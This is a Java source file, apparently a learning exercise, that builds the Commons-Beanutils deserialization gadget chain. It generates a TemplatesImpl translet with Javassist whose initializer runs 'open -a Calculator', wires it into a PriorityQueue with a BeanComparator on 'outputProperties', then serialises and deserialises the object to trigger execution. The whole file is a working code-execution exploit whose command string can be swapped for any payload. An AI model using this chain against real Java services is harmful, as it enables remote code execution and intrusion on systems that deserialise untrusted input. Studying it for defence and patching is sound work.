package com.xiinnn.unser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB {
    public static void main(String[] args) throws Exception{
        byte[][] codes = {getTemplates()};
        //CC3
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "useless");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", codes);

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");

        //将priorityQueue的queue改为templates
        setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});
        //将BeanComparator的property改为outputProperties
        setFieldValue(beanComparator, "property", "outputProperties");
        //序列化
        byte[] bytes = ser(priorityQueue);
        // 反序列化
        unser(bytes);
    }
    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(obj);
        return baos.toByteArray();
    }
    public static Object unser(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(bais);
        return objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] getTemplates() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }
}
